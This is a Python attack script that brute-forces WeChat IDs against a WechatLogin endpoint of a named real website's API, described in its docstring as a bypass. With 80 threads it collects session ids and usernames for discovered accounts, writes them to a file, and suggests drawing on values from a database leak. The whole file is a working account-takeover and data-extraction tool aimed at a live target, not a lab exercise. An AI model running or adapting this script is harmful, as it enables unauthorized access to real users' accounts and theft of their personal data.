#!/usr/bin/env python3
"""
Fast wechatId enumeration for bf1788.com WechatLogin bypass.
Tests large wordlists + generated patterns for account discovery.
Once accounts found, full member data is extracted via sid.
"""
import requests, urllib3, json, sys, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

found_accounts = []
lock = threading.Lock()

def check_wechatid(wechat_id):
    data = {"cmd": "1000", "wechatId": wechat_id, "sid": "", **BASE_PARAMS}
    try:
        r = requests.post(f"{TARGET}?cmd=1000", data=data, timeout=8, verify=False)
        d = r.json()
        if d.get("status") == "0" and "sid" in str(d.get("msg", "")):
            with lock:
                found_accounts.append({
                    "wechatId": wechat_id,
                    "sid": d["msg"]["sid"],
                    "username": d["msg"]["username"]
                })
                print(f"[+] FOUND: {wechat_id} -> sid={d['msg']['sid']}, username={d['msg']['username']}")
    except:
        pass

def generate_candidates():
    candidates = []
    # Alphanumeric 6-char IDs (matching cffcna6qzp pattern)
    import string
    chars = string.ascii_lowercase + string.digits
    
    # Try common patterns
    prefixes = ["test", "wechat", "user", "admin", "player", "member", "bfc", "bf1788", "vip", "vipuser"]
    for prefix in prefixes:
        for i in range(1, 10000):
            candidates.append(f"{prefix}{i}")
    
    # Try 8-char alphanumeric patterns (like cffcna6qzp)
    for c1 in "cfghijkmnpqrstuvwxyz":
        for c2 in "cfghijkmnpqrstuvwxyz":
            candidates.append(f"{c1}{c2}")
    
    # Try known pattern: 8-char username
    for prefix in ["cf", "ab", "cd", "ef", "gh", "ij", "kl", "mn"]:
        for i in range(100000, 999999):
            candidates.append(f"{prefix}{i}")
    
    return candidates

if __name__ == "__main__":
    wordlist = sys.argv[1] if len(sys.argv) > 1 else None
    
    if wordlist:
        with open(wordlist) as f:
            candidates = [line.strip() for line in f if line.strip()]
    else:
        candidates = generate_candidates()
    
    print(f"[*] Testing {len(candidates)} wechatId candidates...")
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=80) as ex:
        futures = [ex.submit(check_wechatid, c) for c in candidates]
        completed = 0
        for f in as_completed(futures):
            completed += 1
            if completed % 10000 == 0:
                elapsed = time.time() - start
                rate = completed / elapsed if elapsed > 0 else 0
                print(f"  Progress: {completed}/{len(candidates)}, found: {len(found_accounts)}, rate: {rate:.0f}/s", flush=True)
    
    elapsed = time.time() - start
    print(f"\n[+] Done in {elapsed:.1f}s: {len(found_accounts)} accounts found out of {len(candidates)} tested")
    
    if found_accounts:
        out_file = "enumeration_results.json"
        with open(out_file, "w") as f:
            json.dump(found_accounts, f, indent=2)
        print(f"[+] Saved to {out_file}")
    else:
        print("[-] No accounts found. The wechatId may be a hash or system-generated with a pattern we haven't identified.")
        print("[-] Recommendation: Try with actual wechatId values from a real user's frontend or database leak.")
